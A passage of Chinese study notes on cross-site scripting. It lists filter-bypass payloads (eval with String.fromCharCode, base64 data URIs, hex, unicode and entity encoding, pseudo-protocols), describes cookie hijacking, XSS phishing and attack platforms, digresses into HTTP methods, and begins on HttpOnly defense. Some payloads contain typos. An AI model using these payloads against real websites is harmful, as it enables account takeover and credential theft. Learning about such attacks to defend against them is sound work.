接受用户的数据后过滤`<>`，再用JavaScript显示出来，输入经过16进制转换后的字符，这些字符都可以轻松的绕过过滤，完整进入代码中，经过JavaScript还原之后，正确解释出来

#### <font color="yellow">002 UBB标签</font>

UBB标签是目前广泛运用到论坛，留言簿，以及其他网站系统的一种编码标签，类似`[img]url[/img]`这样的，用户在中间输入地址后即可，在发表的时候系统会自动改成`<img src=”url”></img>`，这个URL就是用户输入的图片地址，XSS攻击中，可以利用这个特点来达到无需用户输入`<>`就能执行由用户所输入的代码，我们只要在输入网址的地方输入：`x"/**/οnerrοr="alert(‘poruin’)`，那么经过转换后就变成了`<img src=“x”/**/οnerrοr=“alert(‘poruin’)”>`

> JS中的编码还原函数最常用的就是String.fromCharCode了，这个函数用于ASCII码的还原，一般来说，这个函数都要配合`eval()`来使用才有效果
>
> 在跨站中，String.fromCharCode主要是使到一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为ASCII码，然后再用String.fromCharCode还原，因为大多数的过滤系统都不会把String.fromCharCode加以过滤，例如关键字`alert`被过滤掉，那就可以这么利用：`<img src=“x”/**/οnerrοr=“eval(String.fromCharCode(97,108,101,114,116,40,39,112,111,114,117,105,110,39,41))”>`

#### <font color="yellow">003 绕过</font>

1. 前端过滤
> burp抓包改包绕过
2. 双写绕过
> 用于屏蔽一些对大小写敏感的黑名单匹配e.g.：`?id=1 UnIon SeLeCt user()#`
3. 事件绕过
	- onclick
	- onmousemove
4. 大小写绕过
> 用于屏蔽一些对大小写敏感的黑名单匹配e.g.：`?id=1 UnIon SeLeCt user()#`
5. 注释干扰绕过
> e.g.：`<scri<!--test-->pt>alert(1),<scr<!--teat-->ipt>`
6. 伪协议绕过
>
> `111">a href="javascript:alert(document.domain)">xss</a>`
>
> `<table background="javascript:alert(/xss/)"></table>`
>
> `<img src ="javascript:alert('xss';")>`
7. 0x06空格回车Tab绕过
> 1. 空格
>
> 	`<img src="jav    ascript:alert('xss');">`
>
> 2. Tab
>
> 	`<img src="javasc	ript:alert('xss');">`
>
> 3. 回车
>
> ```text
> <img src="jav
> ascript:
> alert('xss'):">
> ```
8. 编码绕过
> 1. base64编码
> 	`eval("")`eval函数把字符串当作程序执行
> 	atob函数是将base64密文转换为明文
> 	`"><script>eval(atob('YWxlcnQoZG9tYWluKQ=='));</script>`
> 	base64编码多用于如下两种情况
> 		1. `<a herf="可控点">`
> 		2. `<iframe src="可控点">`
> 	
> 	如果过滤了`<`、`>`、`'`、`"`、`script`，可以使用base64编码
> 	
> 	`<a herf="data:text/html;base64,PGItZyBzcmM9eCBvbmVycm9yPWFsCXJ0KDEpPg==">test</a>`
> 	
> 	这样当tast A链接点击时，就会以data协议，页面以`html/test`的方式解析，编码为base64，然后点击a链接时，base64的编码就被还原成原本的`<img src=x onerror=alert(1)>`
> 2. JS编码
> 	a. 八进制
> 
> 	三个八进制数字，如果不够，在前面补0
> 
> 	e.g.：`e = \145`
> 
> 	b. 十六进制
> 
> 	两个十六进制数字，如果不够，在前面补0
> 
> 	e.g.：`e = \x65`
> 
> 	十六进制前面加`\x`可以被JS识别
> 
> 	`<>`被转义时，利用十六进制绕过
> 
> 	`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`
> 
> 	c. Unicode
> 
> 	四个十六进制数字，如果不够，在前面补0
> 
> 	e.g.：`e = \u0065`
> 
> 	十六进制前面加`\u00`变成可被JS识别的Unicode编码
> 
> 	`\\uoo3cscript\\u003ealert(document.domain);\\u003c/script\\u003e`
> 
> 	对于一些控制字符，使用特殊的C类型的转义风格(`\r`、`\n`)
> 
> 3. HTML实体编码
> 	
> 	a. 字符编码
> 	
> 	十进制、十六进制编码，样式为`"&#数值;"`
> 	
> 	<font color="red">浏览器是不会在html标签里解析js编码的，所以我们在onerror=后面放js中的编码是不会被解析，你放进去是什么，就是什么</font>
> 
> 	b. HTML5新增的实体命名编码
> 	
> 	`&colon; = [:]`
> 	
> 	`&NewLine; = [Line feed]`
> 	
> 	`<a href="javasc&NewLine;ript&colon;alert(1)">click</a>`
> 
> 4. URL编码
> 	
> 进行两次URL前编码
9. CSS
> 1. 利用IE特性绕过
> 
> 	IE中`‘’`可以闭合一个`“`
> 	
> 	`"onmousemove=alert(1)`
> 
> 2. 利用CSS特性绕过
> 
> 	设置background:url，利用JavaScript伪协议执行js
> 	
> 	`background-color:#f00;background:url("javascript:alert(document.domain);");`
> 
> 3. IE中利用CSS出发xss
> 
> 	CSS中的注释`/**/`
> 
> 	`xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1;})`

#### <font color="yellow">004 XSS简介</font>

XSS(Cross Site Script)跨站脚本攻击

XSS攻击通常指黑客通过HTML注入篡改了网页，插入了恶意脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击

因为在最开始的时候XSS攻击的演示案例首跨域对，所以叫跨站脚本

分类
> 1. 反射型XSS
> 	
> 	简单地把用户输入的数据反射给服务器
> 
> 	黑客需要诱惑用户点击一个恶意链接，才能完成攻击，又称非持久型XSS(Non-persistent XSS)
> 
> 	前端--->后端--->前端
> 
> 2. 存储型XSS
> 
> 	把用户输入的数据存储在服务器端
> 
> 	具有很强的稳定性，又称持久型XSS(Persistent XSS)
> 
> 	前端--->后端--->数据库--->前端
> 
> 3. DOM Based XSS(DOM型XSS)
> 
> 	通过修改页面的DOM节点形成的XSS
> 
> 	前端

#### <font color="yellow">005 XSS攻击进阶</font>

##### <font color="yellow">0001 初探XSS Payload</font>

XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器

这些用以完成各种具体功能的恶意脚本，被称为XSS Payload

XSS Payload实际上就是JavaScript脚本，还可以是Flash或其他富客户端的脚本，所以JavaScript能做到的功能，XSS Payload也能做到

一个最常见的XSS Payload就是通过读取浏览器的Cookie对象，从而发起Cookie劫持的攻击

Cookie中一般加密保存了当前用户的登录凭证，如果Cookie丢失，就意味着用户的登录凭证丢失，攻击者就可以不通过密码，直接进入用户的账户

##### <font color="yellow">0002 强大的XSSPayload</font>

###### <font color="yellow">a. 构造GET与POST请求</font>

特点(http的特点)
> 基于tcp/ip、一种网络应用层协议、超文本传输协议HyperText Transfer Protocol
> 
> 工作方式：客户端请求服务端应答的模式
> 快速：无状态连接
> 灵活：可以传输任意对象，对象类型由Content-Type标记
> 客户端请求request消息
> 	- 请求行(request line)
> 	- 请求头部(header)
> 	- 空行
> 	- 请求数据
> 
> 服务端响应response由四个部分组成
> 	- 状态行
> 	- 消息报头
> 	- 空行
> 	- 响应正文

请求方法
> http请求可以使用多种请求方法
> 	- HTTP1.0定义了三种请求方法
> 		- GET
> 		- POST
> 		- HEAD
> 	- HTTP1.1新增了五种请求方法
> 		- OPTIONS
> 		- PUT
> 		- DELETE
> 		- TRACE
> 		- CONNECT 
> 	
> 	HTTP2.0 新的二进制格式(Binary Format)，HTTP1.x的解析是基于文本
> 	
> 	基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合
> 	
> 	基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮
> 	
> 	多路复用(MultiPlexing)，即连接共享，即每一个request都是是用作连接共享机制的
> 	
> 	一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的id将request再归属到各自不同的服务端请求里面
> 	
> 	header压缩，如上文中所言，对前面提到过HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小
> 	
> 	服务端推送(server push)，同SPDY一样，HTTP2.0也具有server push功能
> 	- [https://baike.baidu.com/item/HTTP%202.0/12520156?fr=aladdin](https://baike.baidu.com/item/HTTP%202.0/12520156?fr=aladdin)
> 	- GET请求指定的页面信息，并返回实体主体
> 	- HEAD类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头
> 	- POST向指定资源提交数据进行处理请求(例如提交表单或者上传文件)，数据被包含在请求体中，POST请求可能会导致新的资源的建立和/或已有资源的修改
> 	- PUT从客户端向服务器传送的数据取代指定的文档的内容
> 	- DELETE请求服务器删除指定的页面
> 	- CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器
> 	- OPTIONS允许客户端查看服务器的性能
> 	- TRACE回显服务器收到的请求，主要用于测试或诊断

区别
> http协议最常见的两种方法GET和POST，这几点答案其实有几点并不准确
> -  请求缓存：GET会被缓存，而post不会
> -  收藏书签：GET可以，而POST不能
> -  保留浏览器历史记录：GET可以，而POST不能
> -  用处：get常用于取回数据，post用于提交数据
> -  安全性：post比get安全
> -  请求参数：querystring是url的一部分get、post都可以带上，get的querystring(仅支持urlencode编码)，post的参数是放在body(支持多种编码)
> -  请求参数长度限制：get请求长度最多1024kb，post对请求数据没有限制

误区
> 针对上面常见的区别，如果面试的时候这么说，肯定是有很大的毛病，刚在学校面试的时候也曾经囫囵吞枣地这样说过，现在回过头再想以前的错误认知，又有许多新的认识
> 
> 用处：请求参数，get是querystring(仅支持urlencode编码)，post是放在body(支持多种编码)query参数是URL的一部分，而GET、POST等是请求方法的一种，不管是哪种请求方法，都必须有URL，而URL的query是可选的
> 
> 请求参数长度限制(下面对各种浏览器和服务器的最大处理能力做一些说明)
> -  IE浏览器对URL的最大限制为2083个字符
> -  Firefox(Browser)：对于Firefox浏览器URL的长度限制为65536个字符
> -  Safari(Browser)：URL最大长度限制为80000个字符
> -  Opera(Browser)：URL最大长度限制为190000个字符
> -  Google Chrome：URL最大长度限制为8182个字符
> -  Apache(Server)：能接受最大url长度为8192个字符
> -  Microsoft Internet Information Server(IIS)：能接受最大url的长度为16384个字符
> 
> 	为了符合所有标准，url的最好不好超过最低标准的2083个字符(2k+35)
> 
> 	当然在做客户端程序时，url并不展示给用户，只是个程序调用，这时长度只收web服务器的影响了
> 
> 	最常见的form表单，浏览器默认的form表单，默认的`content-type`是`application/x-www-form-urlencoded`，提交的数据会按照key-value的方式，jquery的ajax默认的也是这种content-type
> 
> 	在post方式中添加querystring一定是可以接收的到，但是在get方式中加body参数就不一定能成功接收到了
> 
> post不比get安全性要高，这里的安全是相对性，并不是真正意义上的安全，通过get提交的数据都将显示到url上，页面会被浏览器缓存，其他人查看历史记录会看到提交的数据，而post不会，另外get提交数据还可能会造成CSRF攻击

http状态码
> - 1xx - 信息提示
> 	- 100 Continue - 继续
> 	- 101 Switching Protocols - 切换协议
> - 2xx - 成功
> 	- 200 OK - 客户端请求已成功
> 	- 201 Created - 已创建
> 	- 202 Accepted - 已接受
> 	- 203 Non-Authoritative Information - 非权威性信息
> 	- 204 No Content - 无内容
> 	- 205 Reset Content - 重置内容
> 	- 206 Partial Content - 部分内容
> - 3xx - 重定向
> 	- 300 Multiple Choices - 多种选择
> 	- 301 Moved Permanently - 对象已永久重定向(对象已永久移走)
> 	- 302 Found - 对象已临时移动
> 	- 303 See Other - 服务器要将浏览器重定向到另一个资源
> 	- 304 Not Modified - 未修改
> 	- 307 Temporary Redirect - 临时重定向
> 	- 308 Permanent Resident - 不允许浏览器将原本为POST的请求重定向到GET请求上
> - 4xx - 客户端错误
> 	- 400 Bad Request - 客户端请求到语法错误，服务器无法理解
> 	- 401 Unauthorized - 请求要求用户的身份认证
> 	- 402 Payment Required - 保留，将来使用
> 	- 403 Forbidden - 服务器理解请求客户端的请求，但是拒绝执行此请求
> 	- 404 Not Found - 服务器无法根据客户端的请求找到资源(网页)
> 	- 405 Method Not Allowed - 客户端请求中的方法被禁止
> 	- 406 Not Acceptable - 服务器无法根据客户端请求的内容特性完成请求
> 	- 407 Proxy Authentication Required - 请求要求代理的身份认证
> 	- 408 Request Time-out - 服务器等待客户端发送的请求时间过长，超时
> 	- 409 Conflict - 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突
> 	- 410 Gone - 客户端请求的资源已经不存在
> 	- 411 Length Required - 服务器无法处理客户端发送的不带Content-Length的请求信息
> 	- 412 Precondition Failed - 客户端请求信息的先决条件错误
> 	- 413 Request Entity Too Large - 由于请求的实体过大，服务器无法处理，因此拒绝请求，为防止客户端的连续请求，服务器可能会关闭连接
>  	- 414 Request-URL Too Large - 请求的URI过长（URI通常为网址），服务器无法处理
> 	- 415 Unsupported Media Type - 服务器无法处理请求附带的媒体格式
> 	- 416 Requested Range Not Satisfiable - 客户端请求的范围无效
> 	- 417 Expectation Failed - 服务器无法满足Expect的请求头信息
> - 5xx - 服务器错误
> 	- 500 Internal Server Error - 服务器内部错误，无法完成处理
> 	- 501 Not Implemented - 服务器不支持请求的功能，无法完成请求
> 	- 502 Bad Gateway - 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接受到了一个无效的响应
> 	- 503 Service Unavailable - 由于超载或系统维护，服务器暂时无法处理客户端的请求
> 	- 504 Gateway Time-out - 充当网关或代理的服务器，未能及时从远端服务器获取请求
> 	- 505 HTTP Version Not Supported - 服务器不支持请求的HTTP协议的版本，无法完成处理
> 
> 302：在响应头中加入Location参数，浏览器接受到带有location头的响应时，就会跳转到相应的地址
	
减低服务器流量压力
> 根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的，所谓安全的意味着该操作用于获取信息而非修改信息，GET请求一般不应产生副作用，幂等的意味着对同一URL的多个请求应该返回同样的结果，完整的定义并不像看起来那样严格，从根本上讲，其目标是当用户打开一个链接时，她可以确信从自身的角度来看没有改变资源

原理区别
> 一般在浏览器中输入网址访问资源都是通过GET方式，在FORM提交中，可以通过Method指定提交方式为GET或者POST，默认为GET提交，http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE
> 
> URL全称是资源描述符，一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作，GET一般用于获取/查询资源信息，而POST一般用于更新资源信息
> 
> 根据HTTP规范，GET用于信息获取，而且应该是安全的和幂等的
> 
> 所谓安全的意味着该操作用于获取信息而非修改信息，换句话说，GET请求一般不应产生副作用，就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态，<font color="red">这里安全的含义仅仅是指是非修改信息</font>，幂等的意味着对同一URL的多个请求应该返回同样的结果
> 
> 幂等(idempotent、idempotence)是一个数学或计算机学概念，常见于抽象代数中，对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的，如绝对值运算就是一个例子，在实数集中，有`abs(a) = abs(abs(a))`，对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在实数集中幂等，即`max(x,x) = x`，看完上述解释后，应该可以理解GET幂等的含义了，但在实际应用中，以上2条规定并没有这么严格，根据HTTP规范，POST表示可能修改变服务器上的资源的请求
> 
> 上面大概说了一下HTTP规范中，GET和POST的一些原理性的问题，但在实际的做的时候，很多人却没有按照HTTP规范去做，导致这个问题的原因有很多
> 
> 1. 很多人贪方便，更新资源时用了GET，因为用POST必须要到from(表单)，这样会麻烦一点
> 2. 对资源的增，删，改，查操作，其实都可以通过GET/POST完成，不需要用到PUT和DELETE
> 3. 早期的但是Web MVC框架设计者们并没有有意识地将URL当作抽象的资源来看待和设计，还有一个较为严重的问题是传统的Web MVC框架基本上都只支持GET和POST两种HTTP方法，而不支持PUT和DELETE方法
> 
> <font color="red">MVC本来是存在于Desktop程序中的，M是指数据模型，V是指用户界面，C则是控制器，使用MVC的目的是将M和V的实现代码分离，从而使同一个程序可以使用不同的表现形式</font>

表达式区别
> 
> - //http请求行
> - //http请求消息报头
> - //回车换行
> - []//http请求正文

提交方式区别
> 1. GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变
> 	- GET提交：请求的数据会附在URL之后(就是把数据放置在HTTP协议头中)，以?分割URL和传输数据，多个参数用&连接
> 	- POST提交：把提交的数据放置在是HTTP包的包体中
> 2. HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制
> 	- GET：特定浏览器和服务器对URL长度有限制，IE对URL长度的限制是2083字节(2K+35)，对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持
> 	- POST：由于不是通过URL传值，理论上数据不受限，但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置
> 3. 安全性
> 	- POST的安全性要比GET的安全性高<font color="red">这里所说的安全性和上面GET提到的安全不是同个概念，上面安全的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义</font>
> 4. Http get，post，soap协议都是在http上运行的
> 	- GET：请求参数是作为一个key/value对的序列(查询字符串)附加到URL上的查询字符串的长度受到web浏览器和web服务器的限制(IE最多支持2048个字符)，不适合传输大型数据集同时，它很不安全
> 	- POST：请求参数是在http标题的一个不同部分(名为entitybody传输的)，这一部分用来传输表单信息，因此必须将Content-type设置为`application/x-www-form-urlencoded`，post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输
> 	- SOAP：是http post的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为，text/xml任何数据都可以xml化
		
- get是从服务器上获取数据，post是向服务器传送数据
> get和post只是一种传递数据的方式，get也可以把数据传到服务器，他们的本质都是发送请求和接收结果
> 
> 只是组织格式和数据量上面有差别，http协议里面有介绍2.get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到
> 
> post是通过HTTPpost机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址
> 
> 用户看不到这个过程，因为get设计成传输小数据，而且最好是不修改服务器的数据，所以浏览器一般都在地址栏里面可以看到，但post一般都用来传递大数据，或比较隐私的数据，所以在地址栏看不到，能不能看到不是协议规定，是浏览器规定的
- 对于get方式，服务器端用`Request.QueryString`获取变量的值，对于post方式，服务器端用`Request.Form`获取提交的数据
- get传送的数据量较小，不能大于2KB，post传送的数据量较大，一般被默认为不受限制
> 但理论上，IIS4中最大量为80KB，IIS5中为100KB
> 
> post基本没有限制，我想大家都上传过文件，都是用post方式的，只不过要修改form里面的那个type参数
- get安全性非常低，post安全性较高
> 如果没有加密，他们安全级别都是一样的，随便一个监听器都可以把所有的数据监听到
	
一个网站的应用只需要接受HTTP协议中的GET或POST请求，即可完成所有操作，对于攻击者来说，仅通过JavaScript就可以让浏览器发起这两个请求，所以XSS攻击后，攻击者除了可以实施Cookie劫持外，还能够通过模拟GET、POST请求操作用户的浏览器，这在某些隔离环境中会非常有用，比如Cookie劫持失效时，或者目标用户的网络不能访问互联网等情况

###### <font color="yellow">b. XSS钓鱼</font>

> 将XSS与钓鱼结合的思路，利用JavaScript在当前界面伪造一个登录框，当用户在登录框中输入用户名与密码后，其密码会发送到黑客的服务器上
> 
> 充分发挥想象力，可以使XSS攻击的威力更加巨大

###### <font color="yellow">c. 识别用户浏览器</font>

> 在很多时候，攻击者为了获取更大的利益，往往需要准确地手机用户的个人信息
> 
> 但是浏览器的UserAgent是可以伪造的，所以通过JavaScript取出来的这个浏览器对象，信息并不一定准确
> 
> 由于浏览器之间的实现存在差异——不同的浏览器会各自实现一些独特的功能，而同一个浏览器的不同版本之间也可能会有细微的差别
> 
> 所以通过分辨这些浏览器之间的差异，就能准确地判断出浏览器的版本，而几乎不会报错，这种方法比读取UserAgent要准确得多
> 
> [http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/](http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/)

###### <font color="yellow">d. 识别用户安装的软件</font>

> 知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件
> 
> 在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件
> 
> 这种方法很早就被用于挂马攻击——黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的
> 
> 浏览器的扩展与插件也能被XSS Payload扫描出来

###### <font color="yellow">e. CSS History Hack</font>

> 通过CSS，可以发现用户曾经访问过的网站
> 
> 这个技巧最早被Jeremiah Grossman发现，其原理是利用style的visited属性，如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同

###### <font color="yellow">f. 获取用户的真实IP地址</font>

> 通过XSS Payload还有办法获得一些客户端的本地IP地址
> 
> 很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面，网站看到的客户端IP地址是内网的出口IP地址，而并非用户的真实IP地址
> 
> JavaScript本身并没有提供获取本地IP地址的能力
> 
> XSS攻击需要借助第三方软件来完成
> 
> 可以借助以上两点结合第三方软件使用，获得用户IP地址[http://decloak.net/decloak.html](http://decloak.net/decloak.html)

###### <font color="yellow">g. XSS攻击平台</font>

> - Attack API
> 
> 	[http://code.google.com/p/attackapi/](http://code.google.com/p/attackapi/)
> 
> 	由安全研究者pdp所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式
> 
> 	e.g.：获取客户端本地信息的API(3.2.2)
> 
> - BeEF
> 
> 	[http://www.bindshell.net/tools/beef/](http://www.bindshell.net/tools/beef/)
> 
> 	BeEF曾经是最好的XSS演示平台，它演示的是一个完整的XSS攻击过程，BeEF有一个控制后台，攻击者可以在后台控制前端的一切，每一个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，并可以通过XSS向这些用户发送命令
> 
> - XSS- Proxy
> 
> 	是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器
> 
> 这些XSS攻击平台有助于深入了解XSS的原理及危害

###### <font color="yellow">h. XSS Worm</font>

> 注：一种蠕虫病毒
> 
> - Samy Worm
> 
> 	用户之间发生交互行为的页面如果存在存储型XSS，则会比较容易发起XSS Worm攻击
> 
> 	[http://namb.la/popular/tech.html](http://namb.la/popular/tech.html)
> 
> - 百度空间蠕虫
> 
> 	[http://security.ctocio.com.cn/securitycomment/57/7792057.shtml](http://security.ctocio.com.cn/securitycomment/57/7792057.shtml)
> 
> 以上两个蠕虫并不是恶意的蠕虫，真正可怕的蠕虫是那些在无声无息地盗取用户的敏感信息的蠕虫，然而这些蠕虫并不会干扰用户的正常使用，非常隐蔽

###### <font color="yellow">i. 调试JavaScript</font>

> 想写好XSS Payload，需要有很好的JavaScript功底，调试JavaScript也是必不可少的技能
> 
> 工具
> - Firebug：这是最常用的脚本调试工具，前端工程师于Web Hacking必备，被誉为居家旅行的瑞士军刀，Firebug非常强大，它有好几个面板，可以查看页面的DOM节点
> - IE 8 Developer Tools：在IE8中，为开发者内置了一个JavaScript Debugger，可以动态调试JavaScript
> - Fiddler：这是一个本地代理服务器，需要将浏览器设置为使用本地代理服务器上网才可使用，它会监控所有浏览器请求，并有能力在浏览器请求中插入数据，它支持脚本编程，一个强大的Fiddler脚本将非常有助于安全测试[http://www.fidder2.com/fidder2/](http://www.fidder2.com/fidder2/)
> - HttpWatch：这是一个商业软件，它以插件的形式内嵌在浏览器中，它并不能调试JavaScript，它仅仅是一个专业针对Web的Sniffer
> 
> <font color="red">工具只是辅助，并不起关键作用</font>

###### <font color="yellow">j. XSS构造技巧</font>

利用字符编码
> 百度收藏：将`%c1\`组成新的Unicode字符这样`%c1`把转运符号`\`隐藏起来了，从而绕过了系统的安全检查，实施了XSS攻击

绕过长度限制
> 很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的，攻击者可以利用事件(Event)来缩短所需要的字节数，最好的办法是把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload，最常用的一个藏代码的地方，就是location.hash，而且根据HTTP协议，location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录location.hash中的数据，从而也更好地隐藏了黑客真实点意图，因为location.hash的第一个字符是`#`，所以必须去除第一个字符才可运行，location.hash本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够用来写很长的XSS Payload了，如果地址栏了长度不够用，还可以再使用加载远程JS的方法，来写更多代码，在某些环境下，可以通过注释符绕过长度限制

使用`<base>`标签
> `<base>`标签并不常用，它的作用是定义页面上的所有使用相对路径标签的hosting地址，需要特别注意的是，在有技术的文档中，提到`<base>`标签只能用在`<head>`标签内，其实这是不对的，`<base>`标签可以出现在HTML脚本的任意位置并作用于位于标签之后的所有标签，所有在设计XSS安全方案时，一定要过滤掉这个非常危险的标签

`window.name`的妙用
> `window.name`对象是一个很神奇的东西，对当前窗口的`window.name`对象赋值，没有特殊的字符限制，因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制，攻击者利用这个对象，可以实现跨于、跨页面传递数据，在某些环境下，这种特性将变得非常有用，使用`window.name`可以缩短XSS Payload的长度，在同一窗口打开XSS的站点后，只需通过XSS执行相应的代码即可，这个技巧为安全研究者loulou所发现
> 
> [《突破XSS字符数量限制执行任意JS代码》：http://secinn.appspot.com/pstzine/read?issue=3&articleid=4](http://secinn.appspot.com/pstzine/read?issue=3&articleid=4)

Mission Impossible
> 从XSS漏洞利用的角度看，存储型XSS对攻击者的用处比反射型XSS要大，因为存储型XSS在用户访问正常URL时会自动触发，而反射型XSS会修改一个正常的URL，一般要求攻击者将XSS URL发送给用户点击，无形中提高了攻击门槛，有的XSS漏洞被认为只能攻击自己，称之为鸡肋漏洞

Apache Expect Header XSS
> 这个漏洞最早公布于2006年，这个漏洞曾一度被认为是无法利用的所以厂商不认为这是个漏洞，这个漏洞的影响范围是Apache Expect Header版本1.3.34、2.0.57、2.2.1及以下
> 
> 利用过程
> 1. 向服务器提交后返回
> 2. 注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中，因此Expect头中的代码就会被浏览器解析执行
> 
> 从攻击过程可以看出，需要在提交请求时向HTTP头中注入恶意数据，才能触发漏洞，但对于XSS攻击来说，JavaScript工作渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头，因此，这个漏洞曾一度被认为是鸡肋漏洞，后来，安全研究者Amit Klein提出了使用Flash构造请求的方法，成功地利用这个漏洞，变废为宝：在发送Flash中的HTTP请求时，可以自定义大多数的HTTP头

Anehta的回旋镖
> 反射型XSS也有可能像存储型XSS一样利用：将要利用的反射型XSS嵌入一个存储型XSS中
> 
> 这个攻击方法曾经在未知安全研究者实现的一个XSS攻击平台(Anehta)中使用过，他将其命名为回旋镖，因为浏览器同源策略的原因，XSS也受到同源策略的限制(发生在A域上的XSS很难影响B域的用户)
> 
> 思路：如果在B域上存在一个反射型`XSS_B`，在A域上存在一个存储型`XSS_A`，当用户访问A域上的`XSS_A`时，同时嵌入B域上的`XSS_B`，则可达到在A域的XSS攻击B域用户的目的

Flash XSS
> 
> Flash中同样也有可能造成XSS攻击，ActionScript是一种非常强大和灵活的脚本，甚至可以使用它发起网络连接，因此应该尽可能地禁止用户能够上传或加载中定义的Flash文件，如果仅仅是视频文件，则要求转码为flv文件，flv文件是静态文件，不会产生安全隐患，如果是带动态脚本的Flash，则可以通过Flash的配置参数进行限制
> 
> 限制Flash动态脚本的最重要的参数是allowScriptAccress，这个参数定义了Flash能否与HTML页面进行通信
> - always - 对与HTML的通信也就是执行JavaScript不做任何限制
> - sameDomain - 只允许来自于本域的Flash域HTML通信，这是默认值
> - never - 绝对静止Flash域HTML的通信
> 
> 使用always是非常危险的，一般推荐使用never，如果值为sameDomain的话，<font color="red">必须确保Flash文件不是用户上传的</font>
> 
> 除了allowScriptAccress外，allowNetworking也非常关键，这个参数能控制Flash与外部网络进行通信
> - all - 允许使用所有的网络通信，这是默认值
> - internal - Flash不能与浏览器通信，但可以调用其他API
> - none - 禁止任何的网络通信
> 
> 一般建议此值设置为none或internal，设置为all可能带来安全问题
> 
> 除了用户的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞，安全研究者Stefano Di Paola曾经写了一个叫SWFIntruder的工具来检测产生在Flash里的XSS漏洞，通过这个工具可以检测出很多注入Flash变量导致的XSS问题[https://www.owasp.org/index.php/Category:SWFIntruder](https://www.owasp.org/index.php/Category:SWFIntruder)
> 
> Flash XSS往往被开发者所忽视，注入Flash变量的XSS，因为其原因出现在编译后的Flash文件中，一般的扫描工具或者代码审计工具都难以检查，常常使其成为漏网之鱼，OWASP为Flash安全研究设立了一个Wiki页面[https://www.owasp.org/index.php/Category:OWASP_Flash_Security_Project](https://www.owasp.org/index.php/Category:OWASP_Flash_Security_Project)

JavaScript开发框架
> 一般来收成熟的JavaScript开发框架都会注意自身的安全问题，但代码是人写的，高手难免也会犯错，一些JavaScript开发框架也曾暴露过一些XSS漏洞
> 
> - Dojo：Dojo是一个流行的JavaScript开发框架，它曾被发现有XSS漏洞，在Dojo1.4.1中，存在两个DOM型XSS
> - YUI：翻翻YUI的bugtracker也可以看到类似Dojo的问题
> - jQuery：jQuery可能是目前最流行的JavaScript框架，它本身出现的XSS漏洞很少，但开发者该记住的是，JavaScript框架只是对JavaScript语言本身的封装，并不能解决代码逻辑上产生的问题，所以开发者的意识才是安全编码的关键所在

#### <font color="yellow">006 XSS防御</font>

##### <font color="yellow">0001 HttpOnly</font>

HttpOnly是由微软最早提出的并在IE6中实现，至今已经逐渐成为一个标准，浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie

以下浏览器开始支持HttpOnly

- Microsoft IE 6 SP1+
- Mozilla Firefox 2.0.0.5+
- Mozilla Firefox 3.0.0.6+
- Google Chrome
- Apple Safari 4.0+
- Opera9.5+

严格来说，HttpOnly并非为了对抗XSS，它是解决XSS后的Cookie劫持攻击(原理(见前)：如果Cookie设置了HttpOnly，则这种攻击会失败，因为JavaScript读取不到Cookie的值)

一个Cookie的使用过程如下

1. 浏览器想服务器发起请求，这时候没有Cookie
2. 服务器发挥时发送Set- Cookie头，向客户端浏览器写入Cookie
